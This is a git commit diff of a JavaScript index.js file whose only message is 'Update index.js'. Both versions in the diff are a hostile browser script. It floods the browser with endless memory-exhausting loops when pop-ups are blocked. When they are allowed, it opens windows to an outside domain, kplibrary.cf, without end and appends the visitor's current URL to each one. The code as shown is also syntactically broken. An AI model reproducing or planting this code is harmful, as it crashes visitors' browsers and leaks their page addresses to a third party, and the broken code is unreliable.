5b2ddca423cf057d5de2bbae25a5c49f8772ab73
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-13 06:52:41 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,27 +1,27 @@
 var myPopup = window.open("site-on-my-domain", "screenX=100");
 if (!myPopup)
   alert("Please allow pop ups for this website to continue.")
-  while (true) {
+while (true) {
+  setTimeout(function() {
+    txt = "a";
+    while (true) {
+      txt = txt += "a";
+    }
+  }, 5);
+} else {
+  myPopup.onload = function() {
     setTimeout(function() {
-      txt = "a";
-      while (true) {
-        txt = txt += "a";
-      }
-    }, 5);
-  } else {
-    myPopup.onload = function() {
-      setTimeout(function() {
-        if (myPopup.screenX === 0)
+      if (myPopup.screenX === 0)
 
-          while (true) {
-          window.open("http://kplibrary.cf/")
-          var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
-          var URL = "http://kplibrary.cf/" + location.href;
-          var win = window.open(URL, "_blank", strWindowFeatures);
-          setTimeout(function() {
-            for (var i = 0; i === i; i++) {}
-          }, 5);
-        }
-      }, 0);
-    };
-  }
+        while (true) {
+        window.open("http://kplibrary.cf/")
+        var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
+        var URL = "http://kplibrary.cf/" + location.href;
+        var win = window.open(URL, "_blank", strWindowFeatures);
+        setTimeout(function() {
+          for (var i = 0; i === i; i++) {}
+        }, 5);
+      }
+    }, 0);
+  };
+}
